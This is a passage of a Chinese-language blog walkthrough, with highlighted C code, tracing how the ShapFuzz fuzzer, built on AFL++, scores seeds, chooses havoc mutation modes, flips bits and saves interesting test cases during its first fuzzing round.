A即是一个初始化为1，长宽都为centers_num的矩阵</span><br>              <span class="hljs-comment">// b即是一个初始化为0，长宽都为centers_num的矩阵</span><br>            cur_node-&gt;mutated_pos[i].A = M_I(afl-&gt;centers_num);<br>            cur_node-&gt;mutated_pos[i].b = M_Zeros(afl-&gt;centers_num,<span class="hljs-number">1</span>);<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>上述是Shapfuzz中添加的代码，本次执行由于是第一次，输入只有两个种子。因此会跳过。来到下述代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 如果中心种子的生成时间（在执行聚类函数后生成）大于当前队列中向量更新时间  </span><br><span class="hljs-keyword">if</span>(afl-&gt;centers_gen_time &gt; afl-&gt;queue_cur-&gt;vec_update_time)&#123;<br>    <span class="hljs-comment">// 初始化cur数组</span><br>    u32 map_size = afl-&gt;fsrv.map_size;<br>    <span class="hljs-type">float</span>* cur = (<span class="hljs-type">float</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">float</span>) * map_size);<br>    <span class="hljs-built_in">memset</span>(cur, <span class="hljs-number">0</span> ,<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">float</span>) * map_size);<br><span class="hljs-comment">// 执行模糊测试</span><br>    common_fuzz_stuff(afl, out_buf, len);<br>    u32 j = <span class="hljs-number">0</span>;<br>    u8 *src = afl-&gt;fsrv.trace_bits;<br>    <span class="hljs-comment">// 填充cur数组</span><br>    <span class="hljs-comment">// 遍历位图数组，将非0值转换为浮点数并存储于cur数组中。</span><br>    <span class="hljs-keyword">while</span> (j &lt; map_size) &#123;<br>      u8 v = *src;<br>      <span class="hljs-keyword">if</span>(v)&#123;<br>        cur[j] = (<span class="hljs-type">float</span>)v;<br>      &#125;<br>      src++;<br>      ++j;<br>    &#125;<br><span class="hljs-comment">// 计算距离并更新特征向量</span><br>    <span class="hljs-keyword">for</span>(u32 i = <span class="hljs-number">0</span>;i &lt; afl-&gt;centers_num;i++)&#123;<br>        <span class="hljs-comment">// 遍历中心节点（种子）数组，计算cur数组与每个中心的距离，并将结果存储在当前队列条目的特征向量中。</span><br>      <span class="hljs-type">double</span> distance = (<span class="hljs-type">double</span>)cal_distance(cur, afl-&gt;centers[i], map_size);<br>      afl-&gt;queue_cur-&gt;feature_vec-&gt;data[i] = distance;<br>    &#125;<br><span class="hljs-comment">// 更新向量更新时间</span><br>    afl-&gt;queue_cur-&gt;vec_update_time = afl-&gt;centers_gen_time;<br>    <br>  &#125;<br></code></pre></td></tr></table></figure><p>由于本次为Fuzzing的第一轮，因此<code>afl-&gt;centers_gen_time</code>为0，且<code>afl-&gt;queue_cur-&gt;vec_update_time</code>也为0。因此上述执行体会被跳过，来到以下执行：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 如果当前队列长度大于afl已知的最大长度  </span><br><span class="hljs-keyword">if</span>(afl-&gt;queue_cur-&gt;len &gt; afl-&gt;max_len)&#123;<br>    <span class="hljs-comment">// 如果历史变异序列不为空</span><br>    <span class="hljs-keyword">if</span>(afl-&gt;history_mutation_sequence)&#123;<br>        <span class="hljs-comment">// 则释放以下两个数组的空间</span><br>      <span class="hljs-built_in">free</span>(afl-&gt;history_mutation_sequence);<br>      <span class="hljs-built_in">free</span>(afl-&gt;new_mutation_sequence);<br>    &#125;<br><span class="hljs-comment">// 重新分配历史和新变异序列的内存</span><br>    afl-&gt;history_mutation_sequence = (u32 *)<span class="hljs-built_in">calloc</span>(afl-&gt;queue_cur-&gt;len, <span class="hljs-keyword">sizeof</span>(u32));<br>    afl-&gt;new_mutation_sequence = (u32 *)<span class="hljs-built_in">calloc</span>(afl-&gt;queue_cur-&gt;len, <span class="hljs-keyword">sizeof</span>(u32));<br><span class="hljs-comment">// 如果afl-&gt;max_len不为0</span><br>    <span class="hljs-keyword">if</span>(afl-&gt;max_len != <span class="hljs-number">0</span>)&#123;<br>      <span class="hljs-comment">// 释放以下数组内存</span><br>      <span class="hljs-built_in">free</span>(afl-&gt;dataset_reward);<br>      <span class="hljs-built_in">free</span>(afl-&gt;hit_nums);<br>      <span class="hljs-built_in">free</span>(afl-&gt;tmp_mutated_pos);<br>      <span class="hljs-built_in">free</span>(afl-&gt;tmp_mutated_pos_flag);<br>    &#125;<br>    <span class="hljs-comment">// 为以下数组开辟新的空间</span><br>    afl-&gt;dataset_reward = (<span class="hljs-type">double</span> *)<span class="hljs-built_in">calloc</span>(afl-&gt;queue_cur-&gt;len, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">double</span>));<br>    afl-&gt;hit_nums = (<span class="hljs-type">double</span> *)<span class="hljs-built_in">calloc</span>(afl-&gt;queue_cur-&gt;len, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">double</span>));<br>    afl-&gt;tmp_mutated_pos = (u32 *)<span class="hljs-built_in">calloc</span>(afl-&gt;queue_cur-&gt;len, <span class="hljs-keyword">sizeof</span>(u32));<br>    afl-&gt;tmp_mutated_pos_flag = (u8 *)<span class="hljs-built_in">calloc</span>(afl-&gt;queue_cur-&gt;len, <span class="hljs-keyword">sizeof</span>(u8));<br><br>    afl-&gt;max_len = afl-&gt;queue_cur-&gt;len;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">// 将dataset_reward等数组重置</span><br>    <span class="hljs-built_in">memset</span>(afl-&gt;dataset_reward, <span class="hljs-number">0</span>, afl-&gt;max_len * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">double</span>));<br>    <span class="hljs-built_in">memset</span>(afl-&gt;hit_nums, <span class="hljs-number">0</span>, afl-&gt;max_len * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">double</span>));<br>    <span class="hljs-built_in">memset</span>(afl-&gt;tmp_mutated_pos_flag, <span class="hljs-number">0</span>, afl-&gt;max_len * <span class="hljs-keyword">sizeof</span>(u8));<br>  &#125;<br><span class="hljs-comment">// 初始化一些成员变量</span><br>  afl-&gt;history_mutation_sequence_idx = <span class="hljs-number">0</span>;<br>  afl-&gt;new_mutation_sequence_idx = <span class="hljs-number">0</span>;<br>  afl-&gt;tmp_mutated_pos_idx = <span class="hljs-number">0</span>;<br>  afl-&gt;from_splicing = <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>Shapfuzz部分代码结束，接下来对当前队列进行性能评分。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 判断是否使用旧的种子选择策略</span><br><span class="hljs-keyword">if</span> (likely(!afl-&gt;old_seed_selection))<br>    <span class="hljs-comment">// 直接给两个变量赋值，当前队列的性能分数</span><br>    orig_perf = perf_score = afl-&gt;queue_cur-&gt;perf_score;  <br><span class="hljs-keyword">else</span><br>    <span class="hljs-comment">// 否则，则调用caculate_score函数重新计算当前队列条目的性能评分，并将其赋值给afl-&gt;queue_cur-&gt;perf_score</span><br>    afl-&gt;queue_cur-&gt;perf_score = orig_perf = perf_score =<br>        calculate_score(afl, afl-&gt;queue_cur);<br></code></pre></td></tr></table></figure><p>接下来是判断当前队列是否放弃，即性能分数小于等于零并且队列活跃种子数量大于1，则放弃当前队列。</p><p>本次执行不会放弃，来到后续的cmplog功能判断，由于未开启cmplog因此，不会执行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 如果当前队列条目已经通过了确定性测试 或者 跳过确定性测试的全局变量被设置 或者 当前队列条目的性能分数小于某个阈值，这个阈值是MIN(当前队列深度的30倍，Havoc阶段的最大倍数)</span><br><span class="hljs-keyword">if</span> (likely(afl-&gt;queue_cur-&gt;passed_det) || likely(afl-&gt;skip_deterministic) ||<br>    likely(perf_score &lt;<br>           (afl-&gt;queue_cur-&gt;depth * <span class="hljs-number">30</span> &lt;= afl-&gt;havoc_max_mult * <span class="hljs-number">100</span><br>                ? afl-&gt;queue_cur-&gt;depth * <span class="hljs-number">30</span><br>                : afl-&gt;havoc_max_mult * <span class="hljs-number">100</span>))) &#123;<br><span class="hljs-comment">// 满足条件则跳转到`custom_mutator_stage`标签，从而跳过确定性测试阶段。</span><br>  <span class="hljs-keyword">goto</span> custom_mutator_stage;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>程序执行来到<code>custom_mutator_stage</code>标签处，第一句为<code>if (likely(!afl-&gt;custom_mutators_count)) &#123; goto havoc_stage; &#125;</code>，因此再次跳转到havoc_stage阶段。</p><blockquote><p>havoc变异阶段主要用于对输入数据进行大量随机变异，以发现潜在的漏洞。</p></blockquote><p><code>afl-&gt;stage_cur_byte = -1;</code>初始化当前字节位置为-1，表示还没有开始变异。随后判断是否在拼接文件周期内，需要生成相应的描述，本次不在splice 变异中，因此执行一些指纹操作。其中有<code>  afl-&gt;stage_max = (doing_det ? HAVOC_CYCLES_INIT : HAVOC_CYCLES) * perf_score / afl-&gt;havoc_div / 100;</code>根据是否在进行确定性测试，设置stage_max，即最大变异次数。</p><p>接下来就是对最大变异次数做一个判断：<code>if (afl-&gt;stage_max &lt; HAVOC_MIN) &#123; afl-&gt;stage_max = HAVOC_MIN; &#125;</code>本次执行，stage_max值为0x100。而<code>Havoc_MIN=12U</code>，因此不会执行赋值操作。然后，接下去是初始化一些变量：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">temp_len = len; <span class="hljs-comment">// 记录长度</span><br><br>orig_hit_cnt = afl-&gt;queued_items + afl-&gt;saved_crashes; <span class="hljs-comment">// 记录种子池种子+Crash数量</span><br><br>havoc_queued = afl-&gt;queued_items; <span class="hljs-comment">// 种子池中种子数量</span><br></code></pre></td></tr></table></figure><p>接下来是一个if语句，用于处理自定义变异器的变异频率，本次执行不会执行。跳过后，计算r_max，一个随机选择的最大范围，根据不同的条件动态调整这个范围值。接下来又是Shapfuzz中的内容。初始化一些变量后，第一个判断<code>if(afl-&gt;history_mode &amp;&amp; afl-&gt;queue_cur-&gt;ancestor_seed &amp;&amp; afl-&gt;from_splicing == 0 &amp;&amp; afl-&gt;queue_cur-&gt;vec_update_time)</code>其中，<code>afl-&gt;queue_cur-&gt;vec_update_time</code>为0，因此跳过。</p><p>第二个判断<code>if(afl-&gt;new_mode &amp;&amp; afl-&gt;queue_cur-&gt;related_num &amp;&amp; afl-&gt;from_splicing == 0)</code>，前两个条件都为0，因此跳过。</p><p>接下来执行一个循环：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (afl-&gt;stage_cur = <span class="hljs-number">0</span>; afl-&gt;stage_cur &lt; afl-&gt;stage_max; ++afl-&gt;stage_cur) &#123;<br>  &#123;<br>    history_mode = <span class="hljs-number">0</span>;<br>    new_mode = <span class="hljs-number">0</span>;<br>    random_mode = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">double</span> decrease = <span class="hljs-number">0</span>;<br>      <span class="hljs-comment">// 计算decrease</span><br>    <span class="hljs-keyword">if</span>(per_exec_global &gt; <span class="hljs-number">0</span> &amp;&amp; afl-&gt;stats_avg_exec &gt; <span class="hljs-number">0</span> &amp;&amp; per_exec_global &gt;  <span class="hljs-number">2</span> * afl-&gt;stats_avg_exec)&#123;<br>      <br>      decrease = <span class="hljs-number">1.0</span> * (per_exec_global - afl-&gt;stats_avg_exec) / per_exec_global;<br>      <span class="hljs-keyword">if</span>(decrease &gt; <span class="hljs-number">0.3</span>) decrease = <span class="hljs-number">0.3</span>; <span class="hljs-comment">// 限定decrease的值最大为0.3</span><br>    &#125;<br>      <span class="hljs-comment">// 根据`history_able`和`new_able`的值，代码被分为四种情况</span><br>      <span class="hljs-comment">// 情况一：history_able == 0 &amp;&amp; new_able == 0</span><br>    <span class="hljs-keyword">if</span>(history_able == <span class="hljs-number">0</span> &amp;&amp; new_able == <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-comment">// 计算average和weight_random</span><br>      <span class="hljs-type">double</span> average = <span class="hljs-number">1.0</span> * afl-&gt;found_all / afl-&gt;exec_all;<br>      weight_random = <span class="hljs-number">1.0</span> * afl-&gt;queue_cur-&gt;found_by_random / afl-&gt;queue_cur-&gt;exec_random;<br>      <span class="hljs-keyword">if</span>(afl-&gt;queue_cur-&gt;initial_seed == <span class="hljs-number">0</span> &amp;&amp; weight_random &lt; average * (<span class="hljs-number">0.7</span> + decrease))&#123;<br>        <span class="hljs-keyword">break</span>;<br>      &#125; <br>      random_mode = <span class="hljs-number">1</span>;<br>    &#125;<br>      <span class="hljs-comment">// 情况二：history_able == 0 &amp;&amp; new_able == 1</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(history_able == <span class="hljs-number">0</span> &amp;&amp; new_able == <span class="hljs-number">1</span>)&#123;<br>      weight_new = <span class="hljs-number">1.0</span> * afl-&gt;queue_cur-&gt;found_by_new / afl-&gt;queue_cur-&gt;exec_new;<br>      weight_random = <span class="hljs-number">1.0</span> * afl-&gt;queue_cur-&gt;found_by_random / afl-&gt;queue_cur-&gt;exec_random;<br><br>      <span class="hljs-type">double</span> average = <span class="hljs-number">1.0</span> * afl-&gt;found_all / afl-&gt;exec_all;<br>      <span class="hljs-keyword">if</span>(weight_new &lt; average * (<span class="hljs-number">0.7</span> + decrease) &amp;&amp; weight_random &lt; average * (<span class="hljs-number">0.7</span> + decrease))&#123;<br>        <span class="hljs-keyword">break</span>;<br>      &#125; <br><br>      new_line = weight_new;<br>      random_line = new_line + weight_random;<br><br>      <span class="hljs-type">double</span> tmp = ((<span class="hljs-type">double</span>)rand()/RAND_MAX) * random_line;<br>      <span class="hljs-keyword">if</span>(tmp &lt; weight_new) new_mode = <span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">else</span> random_mode = <span class="hljs-number">1</span>;<br>      <span class="hljs-comment">// 情况三：history_able == 1 &amp;&amp; new_able == 0</span><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(history_able == <span class="hljs-number">1</span> &amp;&amp; new_able == <span class="hljs-number">0</span>)&#123;<br>      weight_history = <span class="hljs-number">1.0</span> * afl-&gt;queue_cur-&gt;found_by_history / afl-&gt;queue_cur-&gt;exec_history;<br>      weight_random = <span class="hljs-number">1.0</span> * afl-&gt;queue_cur-&gt;found_by_random / afl-&gt;queue_cur-&gt;exec_random;<br><br>      <span class="hljs-type">double</span> average = <span class="hljs-number">1.0</span> * afl-&gt;found_all / afl-&gt;exec_all;<br>      <span class="hljs-keyword">if</span>(weight_history &lt; average * (<span class="hljs-number">0.7</span> + decrease) &amp;&amp; weight_random &lt; average * (<span class="hljs-number">0.7</span> + decrease))&#123;<br>        <span class="hljs-keyword">break</span>;<br>      &#125; <br><br>      history_line = weight_history;<br>      random_line = history_line + weight_random;<br><br>      <span class="hljs-type">double</span> tmp = ((<span class="hljs-type">double</span>)rand()/RAND_MAX) * random_line;<br>      <span class="hljs-keyword">if</span>(tmp &lt; weight_history) history_mode = <span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">else</span> random_mode = <span class="hljs-number">1</span>;<br>      <span class="hljs-comment">// 情况四：history_able == 1 &amp;&amp; new_able == 1</span><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(history_able &amp;&amp; new_able)&#123;<br>      weight_history = <span class="hljs-number">1.0</span> * afl-&gt;queue_cur-&gt;found_by_history / afl-&gt;queue_cur-&gt;exec_history;<br>      weight_new = <span class="hljs-number">1.0</span> * afl-&gt;queue_cur-&gt;found_by_new / afl-&gt;queue_cur-&gt;exec_new;<br>      weight_random = <span class="hljs-number">1.0</span> * afl-&gt;queue_cur-&gt;found_by_random / afl-&gt;queue_cur-&gt;exec_random;<br><br>      <span class="hljs-type">double</span> average = <span class="hljs-number">1.0</span> * afl-&gt;found_all / afl-&gt;exec_all;<br>      <span class="hljs-keyword">if</span>(weight_history &lt; average * (<span class="hljs-number">0.7</span> + decrease) &amp;&amp; weight_new &lt; average * (<span class="hljs-number">0.7</span> + decrease) &amp;&amp; weight_random &lt; average * (<span class="hljs-number">0.7</span> + decrease))&#123;<br>        <span class="hljs-keyword">break</span>;<br>      &#125; <br><br>      history_line = weight_history;<br>      new_line = weight_history + weight_new;<br>      random_line = new_line + weight_random;<br><br>      <span class="hljs-type">double</span> tmp = ((<span class="hljs-type">double</span>)rand()/RAND_MAX) * random_line;<br>      <span class="hljs-keyword">if</span>(tmp &lt; weight_history) history_mode = <span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(tmp &lt; weight_new) new_mode = <span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">else</span> random_mode = <span class="hljs-number">1</span>;<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>这段for循环，有那么点抽象，从逻辑上来看，每次都貌似只会执行一次；本次执行只执行了一次，就break了。这段循环执行后，来到各种模式的判断。结果是<code>history_mode,new_mode,random_mode</code>全为0.则全跳过。</p><p>随后，设置<code>afl-&gt;use_splice_mutator = 0;</code>即不使用拼接变异。生成一个随机的2的幂次方值，将其存储于<code>afl-&gt;stage_cur_val</code>中。再<code>afl-&gt;splice_num=0;</code>不使用拼接变异。随后通过之前for循环后对模式的判定，将<code>afl-&gt;record_flag</code>置0或1。本次执行置为0.随后一个很长的<strong>for循环</strong>进行随机选择变异器进行变异，变异次数由<code>using_stacking</code>控制，也就是之前的<code>1&lt;&lt;(1+rand_below(afl, afl-&gt;havoc_stack_pow2));</code>生成的一个区间在[2,2*afl-&gt;havoc_stack_pow2]中的随机数。本次执行，这个随机数为8，接下来会对一个种子进行8次变异。</p><p>跳过第一个if语句，对自定义变异器的使用。接下来初始化一个r：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">   <span class="hljs-comment">// 如果使用改变长度的变异器，则r是一个[0,r_max-1]的值，否则是一个[0,46]的值</span><br><span class="hljs-keyword">if</span>(afl-&gt;time_to_use_length_mutator == <span class="hljs-number">0</span>)&#123;<br>     r = rand_below(afl, <span class="hljs-number">47</span>);<br>   &#125;<span class="hljs-keyword">else</span>&#123;<br>     r = rand_below(afl, r_max);<br>   &#125;<br></code></pre></td></tr></table></figure><p>最后执行下来，r的值为0x11。接下来是一个switch语句，对r做出区间划分。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">case</span> <span class="hljs-number">0</span> ... <span class="hljs-number">3</span>: &#123;<br><br>  <span class="hljs-comment">/* Flip a single bit somewhere. Spooky! */</span><br><br>  <span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> INTROSPECTION</span><br>  <span class="hljs-built_in">snprintf</span>(afl-&gt;m_tmp, <span class="hljs-keyword">sizeof</span>(afl-&gt;m_tmp), <span class="hljs-string">&quot; FLIP_BIT1&quot;</span>);<br>  <span class="hljs-built_in">strcat</span>(afl-&gt;mutation, afl-&gt;m_tmp);<br>  <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-comment">// 如果启用了using_feature_mode和history_mode则执行以下代码</span><br>  <span class="hljs-keyword">if</span>(using_feature_mode &amp;&amp; history_mode)&#123;<br>      <span class="hljs-comment">// 根据概率分布，选择种子的一个字节位置</span><br>    pos_tmp = select_position_based_on_distribution(afl);<br>      <span class="hljs-comment">// 计算要翻转的bit位置</span><br>    tmp = (pos_tmp &lt;&lt; <span class="hljs-number">3</span>) + rand_below(afl, <span class="hljs-number">8</span>);<br>      <span class="hljs-comment">// 将选中的位置进行相应更新</span><br>    update(afl, pos_tmp);<br>  &#125; <span class="hljs-comment">// 如果启用了using_feature_mode和new_mode</span><br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(using_feature_mode &amp;&amp; new_mode)&#123;<br>    pos_tmp = afl-&gt;cur_mutation_sequence[rand_below(afl, afl-&gt;cur_mutation_sequence_idx)];<br>      <span class="hljs-comment">// 计算要翻转的bit位置</span><br>    tmp = (pos_tmp &lt;&lt; <span class="hljs-number">3</span>) + rand_below(afl, <span class="hljs-number">8</span>);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    tmp = rand_below(afl, temp_len &lt;&lt; <span class="hljs-number">3</span>);<br>  &#125;<br>    <span class="hljs-comment">// 翻转比特位</span><br>  FLIP_BIT(out_buf, tmp);<br>    <span class="hljs-comment">// 缓冲区已经更改 标志位</span><br>  buf_changed = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">break</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>剩余的情况分别为：</p><ul><li><p>r 在 4 … 7区间内</p><p>将pos_tmp位置的字节进行修改。</p></li><li><p>r 在 8 … 9区间内</p><p>将(outbuf+pos_tmp)位置的字节进行修改。</p><p><code>*(u16 *)(out_buf + pos_tmp) = interesting_16[rand_below(afl, sizeof(interesting_16) &gt;&gt; 1)];</code></p></li><li><p>r 在 10 … 11区间内</p><p>将(outbuf+pos_tmp)位置的字节进行修改。</p><p><code>*(u16 *)(out_buf + pos_tmp) = SWAP16(interesting_16[rand_below(afl, sizeof(interesting_16) &gt;&gt; 1)]);</code></p></li><li><p>r 还有很多区间，不同的是Shapfuzz将改变长度的变异器都放在r值在47以后的区间了。</p></li></ul><p>对一个种子变异结束后，执行<code>common_fuzz_stuff(afl, out_buf, temp_len);</code></p><blockquote><p>common_fuzz_stuff()会写入一个变异后的测试用例，运行目标程序，并处理结果。</p><p>write_to_testcase()函数，写入测试用例，因为启用shm模式，所以会将变异后的测试用例写入共享内存中。</p><p>fuzz_run_target()函数，调用afl_fsrv_run_target()函数进行执行，并接受返回结果。</p><p>afl_fsrv_run_target()函数，执行目标程序，监控是否超时。返回反馈信息。并且在执行时，会自动更新位图。</p><p>save_if_interesting()函数，如果测试实例是”interesting”的，那么就保存到种子池。</p></blockquote><p>接下来对<code>save_if_interesting()</code>函数进行详细解释。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 如果有发现新的边，并且当前测试实例有原始种子，并且from_splicing==0，并且启用的变异器中有拼接变异器，并且没有启动mini_mode</span><br><span class="hljs-keyword">if</span>(afl-&gt;new_edges_found_idx &amp;&amp; afl-&gt;queue_cur-&gt;ancestor_seed &amp;&amp; afl-&gt;from_splicing == <span class="hljs-number">0</span> &amp;&amp; afl-&gt;use_splice_mutator == <span class="hljs-number">1</span> &amp;&amp; afl-&gt;mini_mode == <span class="hljs-number">0</span>)&#123;<br>      <span class="hljs-comment">// 保存长度和当前测试实例于init_len和init</span><br>      u32 init_len = len;<br>      u8* init = ck_alloc(len);<br>      <span class="hljs-built_in">memcpy</span>(init, (u8*)mem, 